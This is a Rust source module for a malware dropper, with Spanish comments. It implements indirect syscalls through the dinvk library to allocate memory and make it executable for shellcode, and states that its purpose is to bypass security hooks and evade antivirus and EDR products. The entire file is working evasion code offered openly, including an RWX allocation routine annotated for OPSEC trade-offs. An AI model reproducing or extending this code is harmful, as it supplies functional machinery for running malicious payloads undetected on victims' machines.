//! Indirect Syscalls para el Dropper usando dinvk
//!
//! Este módulo proporciona syscalls indirectas para la ejecución de shellcode,
//! usando la librería dinvk para evadir hooks de seguridad.
//!
//! Ventajas:
//! - Bypasses hooks en VirtualAlloc/VirtualProtect
//! - Resolución dinámica de syscall numbers
//! - Compatible con múltiples versiones de Windows
//! - Mejor evasión de AV/EDR

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
use dinvk::winapis::{NtAllocateVirtualMemory, NtCurrentProcess, NtProtectVirtualMemory};

/// Allocate RW memory using indirect syscall
/// Returns pointer to allocated memory or null on failure
#[cfg(target_os = "windows")]
pub fn allocate_rw_memory(size: usize) -> *mut c_void {
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE
    );

    if status >= 0 {
        base_address
    } else {
        std::ptr::null_mut()
    }
}

/// Change memory protection to executable using indirect syscall
#[cfg(target_os = "windows")]
pub fn make_memory_executable(address: *mut c_void, size: usize) -> bool {
    let mut base = address;
    let mut region_size = size;
    let mut old_protect: u32 = 0;

    let status = NtProtectVirtualMemory(
        NtCurrentProcess(),
        &mut base,
        &mut region_size,
        0x20, // PAGE_EXECUTE_READ
        &mut old_protect,
    );

    status >= 0
}

/// Allocate RWX memory using indirect syscall (less OPSEC safe)
/// Returns pointer to allocated memory or null on failure
#[cfg(target_os = "windows")]
pub fn allocate_rwx_memory(size: usize) -> *mut c_void {
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    );

    if status >= 0 {
        base_address
    } else {
        std::ptr::null_mut()
    }
}

// Non-Windows stubs
#[cfg(not(target_os = "windows"))]
pub fn allocate_rw_memory(_size: usize) -> *mut std::ffi::c_void {
    std::ptr::null_mut()
}

#[cfg(not(target_os = "windows"))]
pub fn make_memory_executable(_address: *mut std::ffi::c_void, _size: usize) -> bool {
    false
}

#[cfg(not(target_os = "windows"))]
pub fn allocate_rwx_memory(_size: usize) -> *mut std::ffi::c_void {
    std::ptr::null_mut()
}
